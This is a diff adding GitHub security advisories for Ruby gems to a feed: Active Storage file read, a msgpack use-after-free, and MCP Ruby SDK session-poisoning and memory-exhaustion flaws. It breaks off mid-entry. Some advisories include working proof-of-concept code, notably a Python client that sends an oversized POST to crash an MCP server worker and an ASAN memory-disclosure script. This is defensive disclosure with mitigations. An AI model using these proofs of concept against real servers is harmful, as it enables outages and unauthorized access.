+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-66066">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-66066</a></li>
+<li><a href="https://github.com/advisories/GHSA-xr9x-r78c-5hrm">https://github.com/advisories/GHSA-xr9x-r78c-5hrm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xr9x-r78c-5hrm</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-30T18:23:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[activestorage] Active Storage has possible arbitrary file read and remote code execution in Active Storage variant processing]]></title>
+        <id>https://github.com/advisories/GHSA-xr9x-r78c-5hrm</id>
+        <link href="https://github.com/advisories/GHSA-xr9x-r78c-5hrm"/>
+        <updated>2026-07-30T18:23:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>In its default configuration, a Rails application that displays image variants may allow an
+unauthenticated attacker to read arbitrary files from the server, including the process environment.
+That environment typically holds <code>secret_key_base</code> and often credentials for external systems, which
+may in turn allow escalation to remote code execution or lateral movement to those systems.</p>
+<h3 id="details">Details</h3>
+<p>libvips reads and writes file formats through "loaders" and "savers" (or more generally
+"operations"), many of which are backed by third-party libraries. It marks some of these operations
+as "unfuzzed", meaning they are unsafe for untrusted content, and several handle formats unrelated
+to web images. Active Storage did not disable the unfuzzed operations, so an attacker who can upload
+a crafted file and cause a variant to be generated from it may be able to invoke one.</p>
+<p>We are aware of a mechanism by which an attacker, by uploading a crafted file, is able to cause
+disclosure of the contents of arbitrary files accessible on the filesystem of the targeted
+application. One specific attack chain has been reported to us (see "Disclosure" below), but we do
+not assume it is the only one that exists.</p>
+<h3 id="affected-applications">Affected applications</h3>
+<p>An application is affected if it meets all of these requirements:</p>
+<ul>
+<li>Uses libvips for Active Storage image processing. This is <code>config.active_storage.variant_processor = :vips</code>,
+which <code>load_defaults 7.0</code> set and no later default has changed.</li>
+<li>Allows image uploads from untrusted users.</li>
+</ul>
+<p>Generating variants is not a separate requirement.</p>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li>Upgrade to a fixed version of <code>activestorage</code>.</li>
+<li>The minimum version of libvips must be upgraded to <code>&gt;= 8.13</code>.</li>
+<li>Change <code>secret_key_base</code> and change any secrets accessible in the application environment (see "Expire and change secrets" below)</li>
+</ul>
+<p>Earlier versions of libvips (<code>&lt; 8.13</code>) cannot disable unfuzzed operations at all, and Active Storage
+will raise an exception during boot in such an unsecurable environment.</p>
+<h3 id="expire-and-change-secrets">Expire and change secrets</h3>
+<p>Upgrading closes the vulnerability but does not undo an exfiltrated secret if that already
+occurred. An affected application should treat every secret readable by the application process as
+potentially exposed and change it, including:</p>
+<ul>
+<li><code>secret_key_base</code></li>
+<li>The master key, whether stored in <code>config/master.key</code> or supplied as <code>RAILS_MASTER_KEY</code>, along
+with everything in <code>config/credentials.yml.enc</code> that it decrypts</li>
+<li>Credentials for the Active Storage service, such as S3, GCS, or Azure keys</li>
+<li>Database credentials</li>
+<li>Tokens and keys for any third-party service the application calls</li>
+</ul>
+<p>Changing <code>secret_key_base</code> expires active sessions and requires users to log in again. Encrypted
+cookies, signed cookies, signed global IDs, and Active Storage URLs are also affected.</p>
+<p>Rotation should only be used as an intermediate step if necessary. Do not retain an exposed secret
+as a fallback.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If libvips <code>&lt; 8.13</code> is being used, there are no workarounds available other than removing the
+dependency on libvips from the application. Some applications may have <code>ruby-vips</code> declared as a
+dependency only for image analysis, and those applications may be able to simply remove <code>ruby-vips</code>
+from the Gemfile to remove libvips from the application. Applications that do not use Active Storage
+can remove <code>ruby-vips</code> from the Gemfile to avoid the boot-time checks.</p>
+<p>If libvips <code>&gt;= 8.13</code> is present on the system, applications can disable the unfuzzed operations
+without upgrading Rails by setting the <code>VIPS_BLOCK_UNTRUSTED</code> environment variable, which libvips
+reads while initializing.</p>
+<p>Applications also running ruby-vips <code>&gt;= 2.2.1</code> or later can instead call
+<code>Vips.block_untrusted(true)</code> from an initializer.</p>
+<h3 id="releases">Releases</h3>
+<p>The fixed releases are available at the normal locations.</p>
+<h3 id="versions-affected">Versions affected</h3>
+<ul>
+<li>activestorage &lt; 7.2.3.2</li>
+<li>activestorage &gt;= 8.0, &lt; 8.0.5.1</li>
+<li>activestorage &gt;= 8.1, &lt; 8.1.3.1</li>
+</ul>
+<h3 id="disclosure">Disclosure</h3>
+<p>Technical details of the attack chain are intentionally omitted from this advisory. They would add
+nothing to an administrator's decision to upgrade, while making it substantially easier to attack
+applications that have not yet done so.</p>
+<p>Details will be disclosed no later than 2026-08-28, via the <a href="https://discuss.rubyonrails.org/c/security-announcements/9">Rails Security
+Announcements</a> forum.</p>
+<h3 id="credit">Credit</h3>
+<p>This issue was responsibly reported by <a href="https://x.com/0xacb">0xacb</a>, <a href="https://x.com/s3np41k1r1t0">s3np41k1r1t0</a> and <a href="https://x.com/castilho101">castilho</a> from <a href="https://ethiack.com">Ethiack</a>, and <a href="https://ryotak.net">RyotaK</a> from <a href="https://flatt.tech/en/">GMO Flatt Security Inc.</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>libvips 8.13 release notes, <a href="https://www.libvips.org/2022/05/28/What's-new-in-8.13.html#blocking-of-unfuzzed-loaders">blocking of unfuzzed loaders</a></li>
+<li>W.A. Arbaugh, W.L. Fithen, and J. McHugh, <a href="https://doi.org/10.1109/2.889093">"Windows of Vulnerability: A Case Study
+Analysis"</a>, IEEE Computer 33(12), December 2000</li>
+<li><a href="https://ethiack.com/info-hub/research/kindarails2shell-rails-rce-cve">https://ethiack.com/info-hub/research/kindarails2shell-rails-rce-cve</a></li>
+<li><a href="https://blog.flatt.tech/entry/kindarails2shell_rails">https://blog.flatt.tech/entry/kindarails2shell_rails</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm">https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm</a></li>
+<li><a href="https://github.com/rails/rails/commit/1c01bb587206ee6eb0e1179c2cef96a6a47acb1e">https://github.com/rails/rails/commit/1c01bb587206ee6eb0e1179c2cef96a6a47acb1e</a></li>
+<li><a href="https://github.com/rails/rails/commit/349e7a5d5b4b715af1e416db824f3c078a7d59e5">https://github.com/rails/rails/commit/349e7a5d5b4b715af1e416db824f3c078a7d59e5</a></li>
+<li><a href="https://github.com/rails/rails/commit/d79b7f4aa17dec8ce4960fef05733c8c0c7ef49a">https://github.com/rails/rails/commit/d79b7f4aa17dec8ce4960fef05733c8c0c7ef49a</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v7.2.3.2">https://github.com/rails/rails/releases/tag/v7.2.3.2</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v8.0.5.1">https://github.com/rails/rails/releases/tag/v8.0.5.1</a></li>
+<li><a href="https://github.com/rails/rails/releases/tag/v8.1.3.1">https://github.com/rails/rails/releases/tag/v8.1.3.1</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2026-66066.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2026-66066.yml</a></li>
+<li><a href="https://thehackernews.com/2026/07/critical-rails-flaw-could-let.html">https://thehackernews.com/2026/07/critical-rails-flaw-could-let.html</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-66066">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-66066</a></li>
+<li><a href="https://github.com/advisories/GHSA-xr9x-r78c-5hrm">https://github.com/advisories/GHSA-xr9x-r78c-5hrm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xr9x-r78c-5hrm</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-30T18:23:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[msgpack] MessagePack::Buffer#clear Use-After-Free that Enables Cross-Buffer Disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-4mrv-5p47-p938</id>
+        <link href="https://github.com/advisories/GHSA-4mrv-5p47-p938"/>
+        <updated>2026-07-30T16:33:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>MessagePack::Buffer#clear</code> shifts out every chunk and returns its 4 KiB rmem page to the shared pool, but does not reset the buffer's rmem cursor (<code>rmem_last</code>, <code>rmem_end</code>, <code>rmem_owner</code>). The next write sees "unused rmem space" left over from the freed page and hands back a slice of memory that has already been returned to the pool. A second <code>MessagePack::Buffer</code> then re-acquires that same page, so reading the cleared-and-rewritten buffer discloses the second buffer's bytes — a same-process use-after-free with cross-buffer information disclosure (and the symmetric write-corruption).</p>
+<h3 id="details">Details</h3>
+<ul>
+<li><code>msgpack_buffer_clear()</code> → <code>_msgpack_buffer_shift_chunk()</code> (<code>ext/msgpack/buffer.c:151</code>, <code>:128</code>) destroys chunks (<code>_msgpack_buffer_chunk_destroy</code>, <code>:58</code>, returns the page via <code>msgpack_rmem_free</code>) but resets only <code>tail_buffer_end</code>/<code>read_buffer</code>, leaving <code>rmem_last</code>/<code>rmem_end</code>/<code>rmem_owner</code> pointing into the freed page.</li>
+<li>Next <code>Buffer#write</code> → <code>_msgpack_buffer_chunk_malloc()</code> reuse branch (<code>:363</code>) returns <code>b-&gt;rmem_last</code>, a pointer into the already-freed page.</li>
+<li>A second buffer's first write calls <code>msgpack_rmem_alloc()</code> and gets the same physical page back from the pool → the two buffers alias the same memory.</li>
+<li>Sanitizer note: rmem (<code>ext/msgpack/rmem.h</code>) recycles pages with a slab bitmask, not <code>free()</code>, so a stock ASAN build does not abort; the cross-buffer disclosure below is the proof.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Single self-contained script (builds msgpack from rubygems with AddressSanitizer, then runs the PoC):</p>
+<pre><code class="language-bash">set -e
+WORK="$(mktemp -d)"; cd "$WORK"
+
+# 1) PoC
+cat &gt; poc.rb &lt;&lt;'RUBY'
+b1 = MessagePack::Buffer.new(nil, write_reference_threshold: 256)
+b1.write('M' * 1000); b1.write('A' * 200); b1.write('N' * 1000)
+b1.clear
+b1.write('C' * 128)
+secret = ('s' * 200) + ('ABCD' * 32) + ('t' * 400)
+b2 = MessagePack::Buffer.new(nil, write_reference_threshold: 4096)
+b2.write(secret)
+leaked = b1.read_all
+donor  = b2.read_all
+puts 'b1_first64:' + leaked.byteslice(0, 64)
+puts 'b2_donor64:' + donor.byteslice(200, 64)
+puts 'leaked_is_C:' + (leaked == 'C' * 128).to_s
+puts 'cross_buffer_match:' + (leaked == donor.byteslice(200, 128)).to_s
+RUBY
+
+# 2) ASAN build of msgpackfrom rubygems
+cat &gt; Dockerfile &lt;&lt;'DOCKER'
+FROM ruby:3.3-bookworm
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends build-essential libasan8 &amp;&amp; rm -rf /var/lib/apt/lists/*
+RUN gem fetch msgpack -v 1.8.1 &amp;&amp; gem unpack msgpack-1.8.1.gem &amp;&amp; \
+    cd msgpack-1.8.1/ext/msgpack &amp;&amp; \
+    MSGPACK_DEBUG=1 ruby extconf.rb --with-cflags='-O0 -g -fsanitize=address -fno-omit-frame-pointer' --with-ldflags='-fsanitize=address' &amp;&amp; \
+    make -j"$(nproc)" &amp;&amp; cp msgpack.so ../../lib/msgpack/msgpack.so
+DOCKER
+docker build -t msgpack-asan-poc .
+
+# 3) Run under ASAN
+docker run --rm -v "$WORK/poc.rb:/poc.rb:ro" msgpack-asan-poc \
+  bash -c 'export LD_PRELOAD=$(gcc -print-file-name=libasan.so); export ASAN_OPTIONS=detect_leaks=0:halt_on_error=1:abort_on_error=1; RUBYLIB=/msgpack-1.8.1/lib ruby -rmsgpack /poc.rb'
+</code></pre>
+<p>Expected output:</p>
+<pre><code>b1_first64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD
+b2_donor64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD
+leaked_is_C:false
+cross_buffer_match:true
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Same-process cross-buffer information disclosure and corruption: after <code>clear</code> + reuse, one <code>MessagePack::Buffer</code> aliases another's memory, leaking or overwriting serialized data that may belong to a different request or tenant. Requires direct use of the <code>MessagePack::Buffer</code> API with a <code>clear</code>/reuse lifecycle (a supported performance pattern); not reachable from a plain <code>unpack</code> byte stream. Real-world severity <strong>Low–Medium</strong>; clear memory-safety defect with a small, localized fix.</p>
+<h3 id="credit">Credit</h3>
+<p>Pranjali Thakur - depthfirst (<a href="http://depthfirst.com">depthfirst.com</a>)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/msgpack/msgpack-ruby/security/advisories/GHSA-4mrv-5p47-p938">https://github.com/msgpack/msgpack-ruby/security/advisories/GHSA-4mrv-5p47-p938</a></li>
+<li><a href="https://github.com/msgpack/msgpack-ruby/commit/5627d71606b565641d2dd501b82aae862f4abe90">https://github.com/msgpack/msgpack-ruby/commit/5627d71606b565641d2dd501b82aae862f4abe90</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/msgpack/CVE-2026-54522.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/msgpack/CVE-2026-54522.yml</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54522">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54522</a></li>
+<li><a href="https://github.com/advisories/GHSA-4mrv-5p47-p938">https://github.com/advisories/GHSA-4mrv-5p47-p938</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4mrv-5p47-p938</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-30T16:33:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Ruby SSE Session Poisoning]]></title>
+        <id>https://github.com/advisories/GHSA-5p9g-j988-pcwv</id>
+        <link href="https://github.com/advisories/GHSA-5p9g-j988-pcwv"/>
+        <updated>2026-07-30T14:44:29.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><strong>Vulnerability</strong>: Missing Session Ownership Validation in the Ruby MCP SDK's Streamable and SSE HTTP transport implementation. Any attacker with a stolen session ID can execute tools with the victim's session. This is a silent attack - the victim's session is compromised and being used for unauthorized actions, but it is hard to know for the victim</p>
+<h3 id="details">Details</h3>
+<p><a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/main/lib/mcp/server/transports/streamable_http_transport.rb#L260-L278">https://github.com/modelcontextprotocol/ruby-sdk/blob/main/lib/mcp/server/transports/streamable_http_transport.rb#L260-L278</a></p>
+<p><strong>Victim</strong> starts a legitimate MCP session and receives session ID abc-123
+<strong>Attacker</strong> obtains the session ID (various means - network sniffing, logs, etc. out of scope for this analysis)
+<strong>Attacker</strong> sends POST to /messages/abc-123 with a tool call
+<strong>Server</strong> accepts the request (no ownership validation!)
+<strong>Server</strong> executes the tool and sends response to victim's SSE stream
+<strong>Victim</strong> receives attacker's response, thinking it's legitimate</p>
+<h3 id="poc">PoC</h3>
+<p><a href="https://github.com/user-attachments/files/26044817/attacker_client.py">attacker_client.py</a>
+<a href="https://github.com/user-attachments/files/26044818/legitimate_client.py">legitimate_client.py</a></p>
+<p><strong>Prerequisites</strong></p>
+<ol>
+<li>Python 3.8+</li>
+<li>Install dependencies: <code>requests</code></li>
+</ol>
+<p><strong>Running the Demo</strong></p>
+<ol>
+<li><strong>Terminal 1:</strong> Start the Ruby MCP Server</li>
+</ol>
+<p><code>ruby streamable_http_server.rb</code></p>
+<p>Makes use of <a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/main/examples/streamable_http_server.rb">https://github.com/modelcontextprotocol/ruby-sdk/blob/main/examples/streamable_http_server.rb</a>
+This server has a tool call notification_tool which the clients call</p>
+<ol start="2">
+<li><strong>Terminal 2:</strong>  Start Victim Client</li>
+</ol>
+<p><code>python3 legitimate_client.py</code></p>
+<ol start="3">
+<li><strong>Terminal 3</strong> - Attacker Client:</li>
+</ol>
+<p>Copy the session ID from Terminal 1 and run:</p>
+<pre><code class="language-bash">python3 attacker_client.py abc-123-def-456
+</code></pre>
+<ol start="4">
+<li><strong>Back to Terminal 2</strong> - Victim sees the injected response:</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Integrity:</strong> HIGH - Attacker can execute unauthorized tools and modify state</li>
+<li><strong>Availability:</strong> LOW - Attacker can disrupt victim's session with injected responses</li>
+</ul>
+<h3 id="additional-details">Additional Details</h3>
+<p>Session Hijacking Protection in MCP Implementations</p>
+<p>The MCP specification recommends - "<a href="https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#mitigation-4">MCP servers SHOULD bind session IDs to user-specific information</a>".</p>
+<h4 id="user-binding---comparison-other-sdks">User Binding - Comparison other SDKs</h4>
+<p><strong>csharp-sdk</strong></p>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L36">https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L36</a></li>
+<li><a href="https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L95-L98">https://github.com/modelcontextprotocol/csharp-sdk/blob/main/src/ModelContextProtocol.AspNetCore/SseHandler.cs#L95-L98</a></li>
+</ul>
+<p><strong>Go-sdk</strong></p>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L66">https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L66</a></li>
+<li><a href="https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L316-L320">https://github.com/modelcontextprotocol/go-sdk/blob/main/mcp/streamable.go#L316-L320</a></li>
+</ul>
+<h4 id="comparison-with-the-stream-replacement-vulnerability">Comparison with the Stream Replacement vulnerability</h4>
+<p><strong>Stream Replacement</strong>
+<a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-qvqr-5cv7-wh35">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-qvqr-5cv7-wh35</a></p>
+<ul>
+<li><strong>Target</strong>: SSE stream connection</li>
+<li><strong>Attack Vector</strong>: GET /mcp</li>
+<li><strong>What happens to Victim</strong>: The connection is disconnected and doesn't receive reponses</li>
+</ul>
+<p><strong>Session Poisoning</strong></p>
+<ul>
+<li><strong>Target</strong>: Tool execution</li>
+<li><strong>Attack Vector</strong>: POST /mcp</li>
+<li><strong>What happens to Victim</strong>: The connection stays connected and receives responses of tool calls by attacker</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-5p9g-j988-pcwv">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-5p9g-j988-pcwv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67431">https://nvd.nist.gov/vuln/detail/CVE-2026-67431</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/35466605319a34e4c7808712ae9bb1ca1afb2356">https://github.com/modelcontextprotocol/ruby-sdk/commit/35466605319a34e4c7808712ae9bb1ca1afb2356</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-5p9g-j988-pcwv">https://github.com/advisories/GHSA-5p9g-j988-pcwv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5p9g-j988-pcwv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-30T14:44:28.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Unbounded JSON-RPC request body causes uncontrolled memory allocation in StreamableHTTPTransport]]></title>
+        <id>https://github.com/advisories/GHSA-h669-8m4g-r2hc</id>
+        <link href="https://github.com/advisories/GHSA-h669-8m4g-r2hc"/>
+        <updated>2026-07-30T14:44:08.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An unauthenticated remote attacker can force any MCP Ruby SDK server using <code>MCP::Server::Transports::StreamableHTTPTransport</code> to allocate gigabytes of memory by sending a single oversized JSON-RPC POST. The transport reads the entire HTTP body into a Ruby <code>String</code> and parses it with <code>JSON.parse(body, symbolize_names: true)</code> with no size limit, no <code>Content-Length</code> pre-check, and no streaming parser, allowing trivial denial of service against the worker process.</p>
+<h2 id="affected-component">Affected component</h2>
+<p><code>lib/mcp/server/transports/streamable_http_transport.rb</code>, method <code>handle_post</code>:</p>
+<ul>
+<li>Line 341: <code>body_string = request.body.read</code> — reads the full HTTP body into memory with no upper bound.</li>
+<li>Lines 531–535: <code>JSON.parse(body_string, symbolize_names: true)</code> — fully materialises the parsed object graph; with <code>symbolize_names: true</code> every JSON key also allocates a Ruby symbol.</li>
+</ul>
+<p>The vulnerable path runs <strong>before</strong> session validation, so it is reachable in both the default stateful mode and in <code>stateless: true</code> mode, without an <code>Mcp-Session-Id</code> header and without any prior authentication.</p>
+<p>A second instance of the same root cause exists in <code>lib/mcp/server/transports/stdio_transport.rb:23</code> (<code>$stdin.gets</code> with no <code>limit:</code> argument). The practical impact there is limited because the stdio peer is normally a trusted parent process, but the fix should cover both transports.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Both files below are self-contained. Save them anywhere on disk, run the server in one terminal and the client in another. The only dependencies are the SDK's existing Gemfile entries (<code>rack ~&gt; 3.2</code>, <code>rackup &gt;= 2.1.0</code>, <code>webrick ~&gt; 1.9</code>) and Python's standard library.</p>
+<h3 id="server-oom_poc_serverrb">Server (<code>oom_poc_server.rb</code>)</h3>
+<pre><code class="language-ruby">require "bundler/setup"
+require "mcp"
+require "mcp/server/transports/streamable_http_transport"
+require "rackup"
+require "webrick"
+require "rackup/handler/webrick"
+
+server = MCP::Server.new(name: "oom-poc-target", tools: [])
+transport = MCP::Server::Transports::StreamableHTTPTransport.new(
+  server, stateless: true, enable_json_response: true,
+)
+
+Thread.new do
+  loop do
+    rss_mb = `ps -o rss= -p #{Process.pid}`.to_i / 1024
+    STDERR.puts("[mem] PID=#{Process.pid} RSS=#{rss_mb} MB")
+    sleep 2
+  end
+end
+
+STDERR.puts("[poc] listening on http://127.0.0.1:9293/")
+Rackup::Handler::WEBrick.run(
+  transport,
+  Host: "127.0.0.1", Port: 9293,
+  AccessLog: [], Logger: WEBrick::Log.new(File::NULL),
+)
+</code></pre>
+<h3 id="client-oom_poc_clientpy">Client (<code>oom_poc_client.py</code>)</h3>
+<pre><code class="language-python">import socket
+
+HOST, PORT, PAYLOAD_MB = "127.0.0.1", 9293, 512
+
+inner = b"A" * (PAYLOAD_MB * 1024 * 1024 - 64)
+body  = b'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"x":"' + inner + b'"}}'
+
+headers = (
+    f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
+    f"Content-Type: application/json\r\n"
+    f"Accept: application/json, text/event-stream\r\n"
+    f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
+).encode()
+
+s = socket.create_connection((HOST, PORT), timeout=120)
+s.sendall(headers)
+for i in range(0, len(body), 1 &lt;&lt; 20):
+    s.sendall(body[i:i + (1 &lt;&lt; 20)])
+print(f"sent {PAYLOAD_MB} MB")
+try:
+    print("recv:", s.recv(2048)[:200])
+except OSError as e:
+    print("server unresponsive:", e)
+</code></pre>
+<h3 id="reproduction-commands">Reproduction commands</h3>
+<pre><code class="language-sh">bundle install
+ruby oom_poc_server.rb              # terminal A
+python3 oom_poc_client.py           # terminal B
+</code></pre>
+<h3 id="observed-result">Observed result</h3>
+<p>Tested on macOS, Ruby 3.2.4 (rbenv), against the SDK's <code>main</code> branch with <code>rack 3.2.6 / rackup 2.3.1 / webrick 1.9.2</code>:</p>
+<pre><code>[mem] PID=61394 RSS=44   MB        # idle baseline
+[mem] PID=61394 RSS=44   MB
+[mem] PID=61394 RSS=44   MB
+[mem] PID=61394 RSS=1663 MB        # immediately after one 512 MB POST
+[mem] PID=61394 RSS=1663 MB        # memory not released
+[mem] PID=61394 RSS=1663 MB
+</code></pre>
+<p>A single unauthenticated POST grew the worker's RSS from 44 MB to 1.66 GB (~37× amplification). On any deployment with a per-worker memory cap at or below ~2 GB, the same request OOM-kills the worker.</p>
+<img src="https://github.com/user-attachments/assets/13522d05-b7fa-4c05-ba65-ce8ff7d66d4f" alt="poc1-1" height="836" width="1588">
+
+<img src="https://github.com/user-attachments/assets/b230bf85-bed9-46ca-91cf-53ffd10306a6" alt="poc1-2" height="948" width="1400">
+
+
+
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Attacker requirements:</strong> none beyond TCP reach of the MCP endpoint. No session, no credentials, no prior interaction.</li>
+<li><strong>Effect:</strong> memory-exhaustion denial of service. A single request can take a worker offline; sustained low-rate requests keep the service down across worker restarts. On multi-tenant deployments a single attacker tenant can starve neighbours.</li>
+<li><strong>Affected deployments:</strong> every server mounting <code>MCP::Server::Transports::StreamableHTTPTransport</code> as a Rack app — the canonical HTTP deployment pattern. Both stateful and <code>stateless: true</code> configurations are affected.</li>
+</ul>
+<h2 id="suggested-mitigation">Suggested mitigation</h2>
+<ol>
+<li>Reject requests whose <code>Content-Length</code> (or actual read length) exceeds a configurable threshold (e.g. 4 MiB by default) before calling <code>request.body.read</code>.</li>
+<li>Use a streaming JSON parser, or pass <code>max_nesting:</code> plus a hard byte cap to <code>JSON.parse</code>.</li>
+<li>Apply the same <code>limit:</code> argument to <code>$stdin.gets</code> in <code>StdioTransport</code> for defence in depth.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-h669-8m4g-r2hc">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-h669-8m4g-r2hc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67432">https://nvd.nist.gov/vuln/detail/CVE-2026-67432</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/772e0cb1f9db69312006926eee59a7287ad50166">https://github.com/modelcontextprotocol/ruby-sdk/commit/772e0cb1f9db69312006926eee59a7287ad50166</a></li>
+<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-h669-8m4g-r2hc">https://github.com/advisories/GHSA-h669-8m4g-r2hc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h669-8m4g-r2hc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-30T14:44:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Unbounded session retention in StreamableHTTPTransport allows memory exhaustion via initialize flood]]></title>
+        <id>https://github.com/advisories/GHSA-52jp-gj8w-j6xh</id>
+        <link href="https://github.com/advisories/GHSA-52jp-gj8w-j6xh"/>
+        <updated>2026-07-30T14:43:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>In its default configuration, <code>MCP::Server::Transports::StreamableHTTPTransport</code> never expires sessions. Every successful <code>initialize</code> request stores a new <code>ServerSession</code> and a session record under a fresh UUID, and the only path that removes them is an explicit client-issued HTTP <code>DELETE</code>. An unauthenticated attacker can repeatedly initialize new sessions and immediately disconnect, forcing the server to retain an unbounded number of <code>ServerSession</code> objects until memory is exhausted.</p>
+<h2 id="affected-component">Affected component</h2>
+<p><code>lib/mcp/server/transports/streamable_http_transport.rb</code>:</p>
+<ul>
+<li>Line 27, constructor: <code>def initialize(server, stateless: false, enable_json_response: false, session_idle_timeout: nil)</code> — the default for <code>session_idle_timeout</code> is <code>nil</code>.</li>
+<li>Line 46: <code>start_reaper_thread if @session_idle_timeout</code> — when the timeout is <code>nil</code>, the reaper that prunes idle sessions is never started.</li>
+<li>Lines 604–643 (<code>handle_initialization</code>): every successful <code>initialize</code> inserts a new session record; the only removal sites are <code>handle_delete</code> (client-controlled) and stream-error paths.</li>
+</ul>
+<p>The project README acknowledges the insecure default (line 1605):</p>
+<blockquote>
+<p>By default, sessions do not expire. To mitigate session hijacking risks, you can set a <code>session_idle_timeout</code> (in seconds).</p>
+</blockquote>
+<p>Per-session memory cost is non-trivial: each entry contains a <code>ServerSession</code> instance (with its own <code>Mutex</code>, <code>@in_flight</code> hash, capabilities hash, and server reference), a top-level hash entry under the session UUID, and per-pending-request <code>Queue</code> allocations.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<h3 id="server-session_poc_serverrb">Server (<code>session_poc_server.rb</code>)</h3>
